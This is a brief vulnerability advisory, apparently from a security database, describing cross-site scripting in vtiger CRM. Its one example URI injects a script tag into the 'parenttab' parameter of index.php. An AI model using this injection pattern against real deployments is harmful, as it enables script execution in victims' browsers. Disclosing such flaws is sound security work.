An attacker can exploit these issues by enticing an unsuspecting victim to follow malicious URIs.

The following example URIs are available:

http://www.example.com/vtigercrm/index.php?module=Products&amp;action=index&amp;parenttab="&gt;&lt;script&gt;alert(1);&lt;/script&gt;
